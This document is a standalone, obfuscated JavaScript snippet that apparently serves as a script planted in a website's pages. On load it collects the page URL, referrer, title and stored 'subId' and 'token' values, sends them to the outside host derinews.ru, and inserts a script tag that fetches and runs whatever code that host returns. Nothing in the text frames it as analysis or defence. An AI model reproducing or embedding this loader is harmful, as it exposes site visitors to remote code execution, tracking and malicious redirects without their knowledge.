 (function() {
    var name = '_V8n7MhDPcr1BqZFC';
    if (!window._V8n7MhDPcr1BqZFC) {
        window._V8n7MhDPcr1BqZFC = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://derinews.ru/F853xbWx',
        };
    }
    const _ffVXvrcTJkxMJdVZ = localStorage.getItem('config');
    if (typeof _ffVXvrcTJkxMJdVZ !== 'undefined' && _ffVXvrcTJkxMJdVZ !== null) {
        var _RH4wk54zJc9vwjzR = JSON.parse(_ffVXvrcTJkxMJdVZ);
        var _qy2fpGtDzG4fbL45 = Math.round(+new Date()/1000);
        if (_RH4wk54zJc9vwjzR.created_at + window._V8n7MhDPcr1BqZFC.ttl < _qy2fpGtDzG4fbL45) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _pBm2CZTYk9gc91f2 = localStorage.getItem('subId');
    var _fHnc6k6nXMWBWwch = localStorage.getItem('token');
    var _bKRBjBF9Y1tprLXY = '?return=js.client';
        _bKRBjBF9Y1tprLXY += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _bKRBjBF9Y1tprLXY += '&se_referrer=' + encodeURIComponent(document.referrer);
        _bKRBjBF9Y1tprLXY += '&default_keyword=' + encodeURIComponent(document.title);
        _bKRBjBF9Y1tprLXY += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _bKRBjBF9Y1tprLXY += '&name=' + encodeURIComponent(name);
        _bKRBjBF9Y1tprLXY += '&host=' + encodeURIComponent(window._V8n7MhDPcr1BqZFC.R_PATH);
    if (typeof _pBm2CZTYk9gc91f2 !== 'undefined' && _pBm2CZTYk9gc91f2 && window._V8n7MhDPcr1BqZFC.unique) {
        _bKRBjBF9Y1tprLXY += '&sub_id=' + encodeURIComponent(_pBm2CZTYk9gc91f2);
    }
    if (typeof _fHnc6k6nXMWBWwch !== 'undefined' && _fHnc6k6nXMWBWwch && window._V8n7MhDPcr1BqZFC.unique) {
        _bKRBjBF9Y1tprLXY += '&token=' + encodeURIComponent(_fHnc6k6nXMWBWwch);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._V8n7MhDPcr1BqZFC.R_PATH + _bKRBjBF9Y1tprLXY;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
